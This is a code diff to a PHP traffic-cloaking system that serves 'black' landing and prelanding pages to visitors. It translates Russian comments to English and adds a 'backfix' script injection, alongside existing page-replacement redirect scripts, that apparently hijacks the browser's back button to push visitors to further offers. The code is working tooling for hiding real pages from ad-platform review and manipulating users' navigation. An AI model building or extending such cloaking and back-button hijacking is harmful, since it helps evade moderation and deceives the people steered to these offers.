@@ -35,8 +35,7 @@ function load_content_with_include($url): string
     return $html;
 }
 
-//TODO:Add Backfix
-//Подгрузка контента блэк проклы из другой папки
+//Load content of black landing from another folder
 function load_prelanding($url, $land_number): string
 {
     global $c; //campaign
@@ -52,10 +51,10 @@ function load_prelanding($url, $land_number): string
     $mp = new MacrosProcessor();
     $html = $mp->replace_html_macros($html);
     $html = fix_phone_and_name($html);
-    //добавляем во все формы сабы
+    //adding subs into forms
     $html = insert_subs_into_forms($html);
 
-    //убираем target=_blank если был изначально на прокле
+    //removing target=_blank
     $html = preg_replace('/(<a[^>]+)(target="_blank")/i', "\\1", $html);
 
     $cloaker = get_cloaker_path();
@@ -69,10 +68,10 @@ function load_prelanding($url, $land_number): string
     // Generate base replacement for {offer}
     $replacement = $getLandingUrl($land_number);
 
-    //если мы будем подменять преленд при переходе на ленд, то ленд надо открывать в новом окне
+    //if we will be replacing the prelanding with the landing, then the landing should be opened in a new window
     if ($c->scripts->replacePrelanding) {
         $replacement .= '" target="_blank"';
-        $url = $mp->replace_url_macros($c->scripts->replacePrelandingAddress); //заменяем макросы
+        $url = $mp->replace_url_macros($c->scripts->replacePrelandingAddress); //replacing macros
         $html = insert_file_content($html, 'replaceprelanding.js', '</body>', true, true, '{REDIRECT}', $url);
     }
 
@@ -89,14 +88,15 @@ function load_prelanding($url, $land_number): string
         return $replacement;
     }, $html);
 
+    $url = $mp->replace_url_macros($c->scripts->backfixAddress); 
+    $second = $mp->replace_url_macros($c->scripts->backfixSecondAddress); 
+    $html = add_backfix($html, $url, $second);
 
     $html = add_images_lazy_load($html);
-
     return $html;
 }
 
-//TODO:Add Backfix
-//Подгрузка контента блэк ленда из другой папки
+//Load content of black landing from another folder
 function load_landing($url)
 {
     global $c; //campaign
@@ -123,21 +123,29 @@ function load_landing($url)
     );
 
     $mp = new MacrosProcessor();
-    //если мы будем подменять ленд при переходе на страницу Спасибо, то Спасибо надо открывать в новом окне
+    //if we will be replacing the landing when going to the Thank You page, then the Thank You page should open in a new window
     if ($c->scripts->replaceLanding) {
-        $replacelandurl = $mp->replace_url_macros($c->scripts->replaceLandingAddress); //заменяем макросы
+        $replacelandurl = $mp->replace_url_macros($c->scripts->replaceLandingAddress); //replace macros
         $html = insert_file_content($html, 'replacelanding.js', '</body>', true, true, '{REDIRECT}', $replacelandurl);
     }
 
-    //добавляем во все формы сабы
+    //add subs into forms
     $html = insert_subs_into_forms($html);
 
     $html = insert_file_content($html, "fixanchors.js", "<body", false, true);
     
     $html = $mp->replace_html_macros($html);
-    //заменяем поле с телефоном на более удобный тип - tel + добавляем autocomplete
+    //replace phone field with more convenient type - tel + add autocomplete
     $html = fix_phone_and_name($html);
 
+
+    //adding backfix ONLY if we don't have a prelanding, cause prelanding will have it
+    if ($c->black->preland->action==='none') {
+        $url = $mp->replace_url_macros($c->scripts->backfixAddress); 
+        $second = $mp->replace_url_macros($c->scripts->backfixSecondAddress); 
+        $html = add_backfix($html, $url, $second);
+    }
+    
     $html = add_images_lazy_load($html);
 
     return $html;
@@ -169,9 +177,9 @@ function add_input_attribute($html, $regex, $attribute)
     return $html;
 }
 
-//если тип поля телефона - text, меняем его на tel для более удобного ввода с мобильных
-//добавляем autocomplete к полям name и phone
-//добавляем required, если его нет
+//if type of phone field is text, change it to tel for more convenient input on mobile
+//add autocomplete to name and phone fields
+//add required if it's not there
 function fix_phone_and_name($html)
 {
     //fix type=text to type=tel
@@ -268,7 +276,23 @@ function add_js_testcode(string $html):string
     return insert_after_tag($html, $needle, $jsCode);
 }
 
-//вставляет все сабы в hidden полях каждой формы
+function add_backfix(string $html, $url, $second):string
+{
+    $debug = DebugMethods::On()?'true':'false';
+    $jsCode = "
+    <script src='./scripts/backfix.js' 
+        data-backlink='{$url}' 
+        data-showcaselink='{$second}'
+        data-traceenabled='{$debug}'
+        data-redirect='false'
+        data-isoff='false'>
+    </script>";
+    $needle = '<head>';
+    if (!str_contains($html,$needle)) $needle = '<body>';
+    return insert_after_tag($html, $needle, $jsCode);
+}
+
+//inserts all subs into hidden fields of each form
 function insert_subs_into_forms($html)
 {
     global $c; //campaign
@@ -294,7 +318,7 @@ function insert_subs_into_forms($html)
 
 
 
-//переписываем все относительные src и href (не начинающиеся с http или с //)
+//rewrite relative urls (not starting with http or //)
 function rewrite_relative_urls($html, $url)
 {
     $modified = preg_replace('/\ssrc=[\'\"](?!http|\/\/|data:)([^\'\"]+)[\'\"]/', " src=\"$url\\1\"", $html);
